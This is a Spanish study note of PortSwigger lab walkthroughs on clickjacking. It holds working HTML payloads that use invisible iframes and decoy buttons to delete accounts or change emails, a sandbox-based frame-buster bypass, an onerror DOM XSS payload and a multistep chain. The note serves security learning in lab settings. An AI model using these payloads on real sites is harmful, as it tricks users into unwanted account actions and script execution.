---
aliases: ["Clickjacking"]
tags:
  - hacking/explotacion
  - hacking/web
  - hacking/laboratorios
estado: 🟢 Terminado
---
El clickjacking es una técnica maliciosa diseñada para engañar a usuarios de internet con el fin de que revelen información confidencial o tomen control de su ordenador al hacer clic en elementos de páginas web aparentemente inocentes.

> [!info] Concepto de Clickjacking  
> El Clickjacking, también conocido como "UI Redressing", es un ataque donde un atacante superpone una interfaz de usuario maliciosa (generalmente transparente) sobre una interfaz de usuario legítima. Esto engaña al usuario para que haga clic en el elemento subyacente sin saberlo, realizando una acción no deseada en el sitio web legítimo.

## PortSwigger

### Basic clickjacking with CSRF token protection

El objetivo es lograr que la víctima elimine su cuenta al hacer clic en nuestra web.

> [!info] Protección CSRF y Clickjacking  
> Aunque los tokens CSRF (Cross-Site Request Forgery) protegen contra la falsificación de solicitudes, no previenen directamente el Clickjacking. Un ataque de Clickjacking engaña al usuario para que *genere* una solicitud legítima (incluyendo el token CSRF válido) al interactuar con la interfaz de usuario oculta. La protección contra Clickjacking se logra mejor con cabeceras como `X-Frame-Options` o `Content-Security-Policy: frame-ancestors`.

En este punto vamos a tener que engañar al usuario para que realice ciertas acciones maliciosas. Vamos a jugar con `iframe` primero para cargar la página en la que tenemos el botón de eliminar:

```html
<iframe src="https://0a0b00230425c77880df0385008400ec.web-security-academy.net/my-account" width="100%" height="100%"></iframe>
```

![[Pasted image 20250912090309.png]]

![[Pasted image 20250912090337.png]]

El propósito en este punto es insertar otro texto dentro del botón. Para esto debemos ir jugando con HTML para lograrlo. El resultado en este caso es el siguiente:

```html
<style>
iframe{
  width: 500px;
  height: 600px;
  opacity: 0.1;
}
div{
  position: relative;
  top:510px;
  left:45px;
}
</style>

<div>click</div>
<iframe src="https://0a0b00230425c77880df0385008400ec.web-security-academy.net/my-account"></iframe>
```

> [!tip] Opacidad en `iframe` para Clickjacking  
> La reducción de la opacidad del `iframe` a valores muy bajos (ej. `0.1`, `0.001`) es una técnica clave en Clickjacking. Esto hace que el contenido legítimo sea casi invisible para el usuario, permitiendo que el elemento malicioso (como un `div` con "click") se superponga y capture el clic, mientras el navegador procesa la acción en el `iframe` oculto.

Esto es válido y, aunque no me funciona el Lab, se debería completar.

---

### Lab: Clickjacking with form input data prefilled from a URL parameter

Como el objetivo es cambiar el email, vamos a capturar la petición que nos permite hacer eso:

![[Pasted image 20250912115350.png]]

Podemos observar cómo está construida la petición. Vamos a intentar ver qué seguridad se cumple con el `csrf`, cómo eliminarlo o cambiar el método, además de eliminar caracteres y más.

La verdad no encontramos nada fuera de lo común, por lo que vamos a intentar ver si podemos insertar información desde la URL en la parte de correo. Usualmente para esto en la URL se emplea un parámetro y puede ser el `id`, `class` o `name` que contiene el campo:

![[Pasted image 20250912115908.png]]

Vemos que se llama `email`. Vamos a intentar ver si nos deja hacer esto en la URL:

![[Pasted image 20250912120359.png]]

Perfecto, podemos observar que sí. Mediante el parámetro `email` podemos dar valor al campo sin enviar aún la solicitud.

> [!tip] Prefill de campos vía URL  
> Muchos formularios web permiten prellenar campos utilizando parámetros en la URL (ej. `?email=valor`). Esta funcionalidad, aunque útil para la experiencia de usuario, puede ser explotada en ataques de Clickjacking o Phishing para presentar al usuario un formulario ya completado con datos maliciosos, facilitando la ingeniería social.

Con esto claro, podemos crear nuestra web maliciosa:

```html
<style>
  iframe {
    width: 500px;
    height: 600px;
  }
</style>

<iframe
  src="https://0a5100d3043d67e780dc8fe6000200bf.web-security-academy.net/my-account?email=hacked@hacked.com"></iframe>
```

![[Pasted image 20250912120829.png]]

Vemos qué sucede:

![[Pasted image 20250912120916.png]]

Perfecto, ya tenemos el campo relleno. En este punto se puede hacer el mismo proceso que en el lab anterior, quedando de la misma manera:

```html
<style>
  iframe {
    width: 500px;
    height: 600px;
    opacity: 0.001;
  }

  div {
    position: relative;
    top: 460px;
    left: 50px;
  }
</style>

<div>click</div>
<iframe
  src="https://0a5100d3043d67e780dc8fe6000200bf.web-security-academy.net/my-account?email=hacked@hacked.com"></iframe>
```

![[Pasted image 20250912122350.png]]

Con esto se completa la máquina. Lab terminado.

---

### Lab: Clickjacking with a frame buster script

Este laboratorio tendrá el mismo objetivo que en los anteriores, con un pequeño problema: la web, mediante un script, impide que la página cargue dentro de un `iframe`.

Para burlarla, vamos a hacer uso del atributo `sandbox`. El concepto es sencillo: al definirlo dentro del `iframe`, este va a restringir todo lo que cargue, pero sabiendo que la información es un formulario, lo que se hace es pasarle el valor `allow-forms`.

Con esto en mente y tomando en cuenta que es un Clickjacking, el código de nuestra web maliciosa queda de la siguiente manera:

```html
<style>
  iframe {
    width: 500px;
    height: 600px;
    opacity: 0.001;
  }

  div {
    position: relative;
    top: 460px;
    left: 50px;
  }
</style>

<div>click</div>
<iframe sandbox="allow-forms"
  src="https://0a5100d3043d67e780dc8fe6000200bf.web-security-academy.net/my-account?email=hacked@hacked.com"></iframe>
```

> [!warning] Frame busters y `sandbox`  
> Los "frame busters" son scripts JavaScript diseñados para evitar que una página sea incrustada en un `iframe` (ej. `if (top != self) { top.location.replace(self.location); }`). El atributo `sandbox` en el `iframe` puede ser una contramedida. Al usar `sandbox="allow-forms"`, se restringen muchas funcionalidades del `iframe` (scripts, popups, etc.), pero se permite el envío de formularios, lo que puede ser suficiente para burlar un frame buster si el ataque solo requiere la interacción con un formulario.

![[Pasted image 20250912131446.png]]

Con esto el Lab está terminado.

---

### Exploiting clickjacking vulnerability to trigger DOM-based XSS

En este lab lo primero es encontrar el XSS. Mediante una pequeña búsqueda se determinó que está en el apartado de `feedback`, exactamente en el campo `name`:

![[Pasted image 20250912133236.png]]

![[Pasted image 20250912133423.png]]

El objetivo es ir cargando información en cada campo y, mediante el Clickjacking, hacer que el usuario envíe la petición maliciosa.

Primero vamos a ver si podemos rellenar los campos desde la URL, como vimos que se pudo en la máquina anterior:

```url
https://0a0c00e703ec8b3580cb1293008000ee.web-security-academy.net/feedback?name=Name&email=test@test.com&subject=hola&message=hola
```

![[Pasted image 20250912133759.png]]

Perfecto, logramos cambiar mediante la URL los campos.

Por último, vamos a crear nuestra web maliciosa para efectuar el Clickjacking, además de inyectar en el apartado `name` el `print()` que se pide para completar el lab:

```html
<style>
  iframe {
    width: 500px;
    height: 900px;
    opacity: 0.0001;
  }

  div {
    position: relative;
    top: 810px;
    left: 50px;
  }
</style>

<div>click</div>
<iframe
  src="https://0a0c00e703ec8b3580cb1293008000ee.web-security-academy.net/feedback?name=<img+src=0+onerror='print()'>&email=test@test.com&subject=hola&message=hola"></iframe>
```

> [!info] XSS basado en DOM y Clickjacking  
> La combinación de Clickjacking con XSS (Cross-Site Scripting) basado en DOM es potente. El Clickjacking engaña al usuario para que interactúe con un elemento que, a su vez, inyecta un payload XSS en el DOM del navegador de la víctima. Esto puede llevar a la ejecución de código arbitrario en el contexto del sitio web, permitiendo robo de sesiones, redirecciones o manipulación de contenido.

![[Pasted image 20250912134611.png]]

Lo enviamos y debería resolverse. Lab terminado.

---

### Lab: Multistep clickjacking

Para este laboratorio tenemos que crear una cadena de ataque donde el usuario va a borrar su cuenta y luego confirmar la operación. El laboratorio es similar a los anteriores:

```html
<style>
iframe{
  width:500px;
  height: 600px;
  opacity: 0.000001;
}
.firstClick{
  position: absolute;
  top:497px;
  left:60px;
}
.nextClick{
  position: absolute;
  top:290px;
  left:200px;
}
</style>

<div class="firstClick">Click me first</div>
<div class="nextClick">Click me next</div>

<iframe src="https://0a8c008c0417d47785676eb5005c00ca.web-security-academy.net/my-account"></iframe>
```

![[Pasted image 20250912165605.png]]

![[Pasted image 20250912165613.png]]

Lab terminado.